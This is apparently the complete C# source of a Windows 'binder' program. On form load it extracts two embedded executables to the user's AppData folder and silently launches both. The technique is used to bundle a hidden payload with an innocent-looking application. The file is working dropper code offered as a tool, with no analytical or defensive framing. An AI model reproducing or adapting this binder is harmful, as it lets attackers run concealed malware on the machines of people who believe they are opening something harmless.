using System;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Diagnostics;

namespace ActualBinder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static void extractResource(String embeddedFileName, String destinationPath)
        {
            var currentAssembly = Assembly.GetExecutingAssembly();
            var arrResources = currentAssembly.GetManifestResourceNames();
            foreach (var resourceName in arrResources)
            {
                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
                {
                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
                    {
                        using (var output = File.OpenWrite(destinationPath))
                            resourceToSave.CopyTo(output);
                        resourceToSave.Close();
                    }
                }
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            string exePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BindedProcess.exe";
            string exePath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MainProcess.exe";
            Thread.Sleep(50);
            extractResource("Name to be extracted as.exe", exePath);
            Process.Start(exePath);
            extractResource("Name to be extracted as2.exe", exePath2);
            Process.Start(exePath2);
        }
    }
}
